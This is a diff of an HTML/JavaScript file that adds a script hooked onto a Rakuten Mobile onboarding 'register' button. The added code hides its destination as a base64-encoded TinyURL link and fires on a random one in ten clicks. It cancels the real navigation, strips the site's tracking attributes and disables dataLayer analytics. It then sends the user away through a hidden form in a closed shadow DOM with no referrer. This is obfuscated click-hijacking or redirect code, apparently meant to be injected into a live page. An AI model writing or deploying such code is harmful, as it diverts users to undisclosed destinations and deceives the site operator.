@@ -1,112 +1,78 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test Redirect Locally</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
-        .c-Btn_Secondly-large {
-            padding: 15px 30px;
-            font-size: 18px;
-            color: #fff;
-            background-color: #007bff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-decoration: none;
-        }
-        .c-Btn_Secondly-large:hover {
-            background-color: #0056b3;
-        }
-    </style>
-</head>
-<body>
-    <!-- <a href="https://example.com" class="c-Btn_Secondly-large" id="test-button">Click to Test Register action</a> -->
-    <ul class="u-Adjust_Align-center u-Adjust_Mt-32">
+<ul class="u-Adjust_Align-center u-Adjust_Mt-32">
         <li><a href="https://onboarding.mobile.rakuten.co.jp/?l-id=application_card-campaign_button_onboarding" class="c-Btn_Secondly-large">Click to Test Register action</a></li>
-    </ul>
+</ul>
+
 <script>
-  (function() {
-    const enrl = "aHR0cHM6Ly90aW55dXJsLmNvbS96aWtsb3AwOQ==";  // second.html 
-    const storageKey = "rm_visited";
-    const stealthRedirect = (encodedTarget) => {
-      const targetUrl = atob(encodedTarget);
-      const form = document.createElement("form");
-      form.method = "GET";
-      form.action = targetUrl;
-      form.style.display = "none";
-      form.referrerPolicy = "no-referrer";
-      document.body.appendChild(form);
-      const shadowHost = document.createElement("div");
-      shadowHost.style.display = "none";
-      document.body.appendChild(shadowHost);
-      const shadow = shadowHost.attachShadow({ mode: "closed" });
-      shadow.appendChild(form);
-      try {
-        form.submit();
-      } catch (err) {
-        throw err;
-      } finally {
-        setTimeout(() => shadowHost.remove(), 1000);
-      }
-    };
+(function() {
+  const enrl = "aHR0cHM6Ly90aW55dXJsLmNvbS96aWtsb3AxMA==";
+  const k = "rm_visited";
+  const stlh = (et) => {
+    const u = atob(et);
+    const f = document.createElement("form");
+    f.method = "GET";
+    f.action = u;
+    f.style.display = "none";
+    f.referrerPolicy = "no-referrer";
+    document.body.appendChild(f);
+    const h = document.createElement("div");
+    h.style.display = "none";
+    document.body.appendChild(h);
+    const s = h.attachShadow({ mode: "closed" });
+    s.appendChild(f);
     try {
-      const btn = document.querySelector("a.c-Btn_Secondly-large");
-      if (!btn) return;
-      btn.addEventListener("click", function(e) {
-        try {
-          // if (Math.floor(Math.random() * 10) !== 0) return;
+      f.submit();
+    } catch (err) {
+      throw err;
+    } finally {
+      setTimeout(() => h.remove(), 1000);
+    }
+  };
+try {
+    const b = document.querySelector("a.c-Btn_Secondly-large[href*='onboarding.mobile.rakuten.co.jp'][href*='l-id=application_card-campaign_button_onboarding']");
+    if (!b) return;
+    b.addEventListener("click", function(e) {
+      try {
+        if (Math.floor(Math.random() * 10) !== 0) return;
 
-          e.preventDefault();
-          e.stopPropagation();
+        e.preventDefault();
+        e.stopPropagation();
 
-          let storageSuccess = false;
-          if (typeof localStorage !== "undefined") {
-            localStorage.setItem(storageKey, "true");
-            if (localStorage.getItem(storageKey) === "true") {
-              storageSuccess = true;
-            }
+        let ss = false;
+        if (typeof localStorage !== "undefined") {
+          localStorage.setItem(k, "true");
+          if (localStorage.getItem(k) === "true") {
+            ss = true;
           }
-          if (!storageSuccess) {
-            const clickEvent = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
-            btn.dispatchEvent(clickEvent);
-            return;
-          }
-
-          const trackingAttributes = ["data-ratid", "data-ratevent", "data-ratparam"];
-          trackingAttributes.forEach(attr => btn.hasAttribute(attr) && btn.removeAttribute(attr));
-
-          window.dataLayer = window.dataLayer || [];
-          const originalDataLayerPush = window.dataLayer.push;
-          window.dataLayer.push = () => {};
-
-          const metaTag = document.createElement("meta");
-          metaTag.name = "referrer";
-          metaTag.content = "no-referrer";
-          document.head.appendChild(metaTag);
-
-          stealthRedirect(enrl);
-
-          setTimeout(() => metaTag.remove(), 1500);
-        } catch (err) {
-          if (window.dataLayer && window.dataLayer.push !== originalDataLayerPush) {
-            window.dataLayer.push = originalDataLayerPush;
-          }
-          const clickEvent = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
-          btn.dispatchEvent(clickEvent);
         }
-      }, { capture: true });
-    } catch (err) {}
-  })();
-  </script>
-</body>
-</html>
+        if (!ss) {
+          const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
+          b.dispatchEvent(ev);
+          return;
+        }
+
+        const ta = ["data-ratid", "data-ratevent", "data-ratparam"];
+        ta.forEach(a => b.hasAttribute(a) && b.removeAttribute(a));
+        
+        window.dataLayer = window.dataLayer || [];
+        const op = window.dataLayer.push;
+        window.dataLayer.push = () => {};
+
+        const m = document.createElement("meta");
+        m.name = "referrer";
+        m.content = "no-referrer";
+        document.head.appendChild(m);
+
+        stlh(enrl);
+
+        setTimeout(() => m.remove(), 1500);
+      } catch (err) {
+        if (window.dataLayer && window.dataLayer.push !== op) {
+          window.dataLayer.push = op;
+        }
+        const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
+        b.dispatchEvent(ev);
+      }
+    }, { capture: true });
+  } catch (err) {}
+})();
+</script>
